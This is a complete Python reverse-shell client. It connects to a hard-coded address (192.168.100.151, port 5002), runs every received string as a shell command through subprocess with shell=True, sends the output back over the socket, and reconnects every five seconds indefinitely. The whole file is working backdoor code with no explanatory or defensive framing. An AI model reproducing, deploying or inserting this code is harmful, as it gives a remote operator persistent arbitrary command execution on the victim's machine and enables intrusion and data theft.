import sys
import socket
import subprocess
import time

HOST = "192.168.100.151"
PORT = 5002

def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def wait_for_command(s):
    data = s.recv(1024).decode('utf-8').strip()
    if data.lower() == "quit":
        s.close()
        sys.exit(0)
    elif len(data) == 0:
        return True
    else:
        # Execute shell command
        proc = subprocess.Popen(data, shell=True,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        stdout_value, stderr_value = proc.communicate()
        s.sendall(stdout_value + stderr_value)
        return False

def main():
    while True:
        try:
            with connect(HOST, PORT) as s:
                socket_died = False
                while not socket_died:
                    socket_died = wait_for_command(s)
        except socket.error as e:
            print(f"Socket error: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            time.sleep(5)

if __name__ == "__main__":
    main()
